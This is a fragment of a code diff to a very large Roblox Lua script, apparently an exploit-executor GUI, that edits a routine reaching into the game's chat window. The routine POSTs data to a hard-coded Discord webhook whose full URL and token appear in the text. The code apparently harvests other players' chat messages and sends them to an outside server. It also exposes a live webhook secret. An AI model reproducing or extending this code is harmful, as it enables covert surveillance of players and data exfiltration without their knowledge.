@@ -30192,13 +30192,8 @@ local script = G2L["29a"];
 	
 	local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1495421144583372852/gfcaXuJASoC1jV0dnZhIYKip-1QkTYCwhwrNlE52huinWxAJXd7tVv8dV4oP1peEq_E4"
 	
-	task.wait(2) -- Wait for chat to load
-	
 	local CoreGui = game:GetService("CoreGui")
-	local ExperienceChat = CoreGui:FindFirstChild("ExperienceChat")
-	
-	if not ExperienceChat then return end
-	
+	local ExperienceChat = CoreGui:WaitForChild("ExperienceChat")
 	local chatWindow = ExperienceChat:WaitForChild("appLayout"):WaitForChild("chatWindow")
 	local scrollingView = chatWindow:WaitForChild("scrollingView")
 	local bottomLockedScrollView = scrollingView:WaitForChild("bottomLockedScrollView")
@@ -30277,7 +30272,7 @@ local script = G2L["29a"];
 		}
 	
 		pcall(function()
-			syn.request({
+			request({
 				Url = WEBHOOK_URL,
 				Method = "POST",
 				Headers = {
